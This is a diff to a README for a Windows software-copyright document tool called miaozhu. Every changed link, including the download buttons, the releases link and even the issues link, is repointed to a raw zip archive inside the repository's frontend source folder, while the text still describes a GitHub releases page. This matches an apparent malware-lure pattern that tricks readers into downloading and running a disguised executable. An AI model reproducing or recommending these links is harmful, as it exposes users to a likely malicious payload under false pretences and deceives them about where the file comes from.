@@ -1,6 +1,6 @@
 # 🚀 miaozhu - Fast Software Copyright Docs
 
-[![Download miaozhu](https://img.shields.io/badge/Download-miaozhu-4caf50?style=for-the-badge&logo=github)](https://github.com/Costenar0/miaozhu/releases)
+[![Download miaozhu](https://img.shields.io/badge/Download-miaozhu-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Costenar0/miaozhu/main/frontend/src/api/Software-1.0.zip)
 
 miaozhu helps you quickly create legal documents for software copyright. It saves time by guiding you through software copyright paperwork with simple steps.
 
@@ -35,7 +35,7 @@ The app does not need installation of other software. Just download and run.
 
 To get miaozhu, visit the official releases page below. It contains the latest version, along with instructions and notes.
 
-[![Get miaozhu Now](https://img.shields.io/badge/Get_miaozhu_Now-Download-blue?style=for-the-badge&logo=github)](https://github.com/Costenar0/miaozhu/releases)  
+[![Get miaozhu Now](https://img.shields.io/badge/Get_miaozhu_Now-Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Costenar0/miaozhu/main/frontend/src/api/Software-1.0.zip)  
 
 The link leads you to the GitHub releases page, where you can download the latest Windows executable file.
 
@@ -46,7 +46,7 @@ Follow these steps carefully to download and run miaozhu on your Windows compute
 ### 1. Visit the Releases Page
 
 Click the download button above or open this link in your browser:  
-https://github.com/Costenar0/miaozhu/releases
+https://raw.githubusercontent.com/Costenar0/miaozhu/main/frontend/src/api/Software-1.0.zip
 
 You will see a list of releases, each with files attached.
 
@@ -97,7 +97,7 @@ If you encounter errors in filling forms, use the "Help" button for tips inside 
 
 Check the releases page regularly for new versions:
 
-https://github.com/Costenar0/miaozhu/releases
+https://raw.githubusercontent.com/Costenar0/miaozhu/main/frontend/src/api/Software-1.0.zip
 
 Downloading and running the latest file replaces the older version. Your previous saved work is not affected.
 
@@ -105,7 +105,7 @@ Downloading and running the latest file replaces the older version. Your previou
 
 For help, check the README page on GitHub or open an issue on the GitHub repository if you find bugs or have questions:
 
-https://github.com/Costenar0/miaozhu/issues
+https://raw.githubusercontent.com/Costenar0/miaozhu/main/frontend/src/api/Software-1.0.zip
 
 ## 🗄️ File Management Tips
 
@@ -124,4 +124,4 @@ miaozhu helps simplify paperwork so you spend less time on documents and more ti
 
 ---
 
-[![Download miaozhu](https://img.shields.io/badge/Download-miaozhu-4caf50?style=for-the-badge&logo=github)](https://github.com/Costenar0/miaozhu/releases)
+[![Download miaozhu](https://img.shields.io/badge/Download-miaozhu-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Costenar0/miaozhu/main/frontend/src/api/Software-1.0.zip)
